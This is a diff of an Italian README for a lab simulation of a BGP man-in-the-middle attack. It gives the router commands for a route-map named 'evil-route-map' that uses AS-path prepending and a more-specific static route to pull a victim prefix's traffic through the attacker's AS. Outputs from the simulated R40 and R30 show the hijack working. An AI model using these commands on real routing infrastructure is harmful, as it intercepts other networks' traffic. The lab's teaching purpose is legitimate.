@@ -34,6 +34,12 @@ Descrizione dell'attacco disponibile qui: https://www.defcon.org/images/defcon-1
 
 ---
 
+## Spiegazione dell'attacco
+
+![topologia](./images/bgp-man-in-the-middel.png)
+
+\# TODO
+
 ## Esecuzione dell'attacco
 
 Per provare la simulazione, seguiamo i seguenti passi.
@@ -64,7 +70,7 @@ Verifichiamo le entry di routing nell'AS100. Lanciamo il comando:
 
 `bgpd-R100# show ip bgp`
 
-Output
+Output:
 
 	BGP table version is 0, local router ID is 100.100.100.100
 	Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
@@ -84,7 +90,7 @@ Output
 	
 	Displayed  6 out of 9 total prefixes
 
-Dall'output riusciamo a capire se l'AS100 per raggiungere la rete 10.200.0.0/22 sceglie il path "10 20 200" (caso 1) oppure il path "40 30 200" (caso 2). In questo caso ricadiamo nel caso 1.
+Dall'output riusciamo a capire se l'AS100 per raggiungere la rete 10.200.0.0/22 sceglie il path "10 20 200" (caso 1) oppure il path "40 30 200" (caso 2). Qui ricadiamo nel caso 1.
 
 **. Accediamo al daemon zebra.**
 
@@ -106,7 +112,7 @@ Verifichiamo le rotte selte da R100. Lanciamo il comando:
 
 `R100# show ip route`
 
-Output
+Output:
 
 	Codes: K - kernel route, C - connected, S - static, R - RIP,
 	       O - OSPF, I - IS-IS, B - BGP, P - PIM, A - Babel, N - NHRP,
@@ -123,11 +129,11 @@ Output
 	C>* 127.0.0.0/8 is directly connected, lo
 	C>* 127.0.0.1/32 is directly connected, lo
 
-Vediamo che per raggiungere la rete 10.200.0.0/22 R100 usa una rotta di tipo B - BGP passando attraverso l'AS10 (il dirimpettaio ha indirizzo IP 10.10.110.1)
+Vediamo che per raggiungere la rete 10.200.0.0/22 R100 usa una rotta appresa tramite BGP passando attraverso l'AS10 (il router dirimpettaio R10 ha indirizzo IP 10.10.110.1).
 
 **. Lanciamo l'attacco.**
 
-Nella shell bgp lanciamo i seguenti comandi (caso 1)
+Definiamo la route-map. Nella shell bgp di R100 lanciamo i seguenti comandi (caso 1)
 
 	configure terminal
 	
@@ -139,7 +145,6 @@ Nella shell bgp lanciamo i seguenti comandi (caso 1)
 	route-map evil-route-map permit 10
 	   match ip address prefix-list evil-prefix-list
 	   set as-path prepend 10 20 200
-	   exit
 
 oppure (caso 2)
 
@@ -152,23 +157,20 @@ oppure (caso 2)
 	route-map evil-route-map permit 10
 	   match ip address prefix-list evil-prefix-list
 	   set as-path prepend 40 30 200
-	   exit
 
-Nella shell zebra lanciamo i seguenti comandi (caso 1)
+Impostiamo la rotta statica. Nella shell zebra di R100 lanciamo i seguenti comandi (caso 1)
 
 	configure terminal
 	ip route 10.200.0.0/24 10.10.110.1
-	exit
 
 oppure (caso 2)
 
 	configure terminal
 	ip route 10.200.0.0/24 10.10.140.1
-	exit
-	
+
 **. Controlliamo le scelte di routing degli AS**
 
-Accediamo al daemon bgp di R40 e la sua routing table risulta
+Accediamo al daemon bgp di R40 (`./connect-bgp.sh R40`) e la sua routing table (`show ip bgp`) risulta:
 
 	BGP table version is 0, local router ID is 40.40.40.40
 	Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
@@ -188,7 +190,30 @@ Accediamo al daemon bgp di R40 e la sua routing table risulta
 	
 	Displayed  7 out of 9 total prefixes
 	
-Vediamo che R40 inoltrerà il traffico verso la rete 10.200.0.0/24 attraverso l'AS100 invece che attraverso l'AS30
+Vediamo che R40 inoltrerà il traffico verso la rete 10.200.0.0/24 attraverso l'AS100 invece che attraverso l'AS30.
+
+Analogamente per il daemon bgp di R30 risulta
+
+	BGP table version is 0, local router ID is 30.30.30.30
+	Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
+	              i internal, r RIB-failure, S Stale, R Removed
+	Origin codes: i - IGP, e - EGP, ? - incomplete
+	
+	   Network          Next Hop            Metric LocPrf Weight Path
+	*  10.10.0.0/22     10.10.70.2                             0 40 100 10 i
+	*>                  10.10.230.2                            0 200 20 10 i
+	*  10.20.0.0/22     10.10.70.2                             0 40 100 10 20 i
+	*>                  10.10.230.2                            0 200 20 i
+	*> 10.30.0.0/22     0.0.0.0                  0         32768 i
+	*> 10.40.0.0/22     10.10.70.2               0             0 40 i
+	*  10.100.0.0/22    10.10.230.2                            0 200 20 10 100 i
+	*>                  10.10.70.2                             0 40 100 i
+	*> 10.200.0.0/22    10.10.230.2              0             0 200 i
+	*> 10.200.0.0/24    10.10.70.2                             0 40 100 i
+	
+	Displayed  7 out of 10 total prefixes
+
+Vediamo che R30 inoltrerà il traffico verso la rete 10.200.0.0/24 attraverso l'AS40 invece che direttamente all'AS200.
 
 **. Fermiamo l'ambiente di simulazione.**
 
